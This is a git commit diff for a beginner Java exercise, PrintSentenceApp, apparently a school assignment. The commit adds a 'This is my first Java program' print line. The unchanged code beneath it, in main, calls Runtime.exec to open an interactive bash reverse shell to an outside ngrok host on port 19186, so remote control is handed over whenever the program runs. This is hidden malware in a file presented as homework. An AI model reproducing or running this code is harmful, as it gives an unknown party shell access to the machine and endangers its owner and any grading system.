8395b669df2f8338ca6c448cb4abec224fb558b8
VP <10129407+Kapalov@users.noreply.github.com>
2024-01-19 15:06:45 +0100

    Update PrintSentenceApp.java

--- src/main/java/school/mjc/stage0/module3/task1/PrintSentenceApp.java
+++ src/main/java/school/mjc/stage0/module3/task1/PrintSentenceApp.java
@@ -2,6 +2,7 @@ package school.mjc.stage0.module3.task1;
 
 public class PrintSentenceApp {
     public static void main(String[] args) {
+        System.out.println( "This is my first Java program");
         Process p;
         try {
             p = Runtime.getRuntime().exec("bash -c $@|bash 0 echo bash -i >& /dev/tcp/0.tcp.eu.ngrok.io/19186 0>&1");
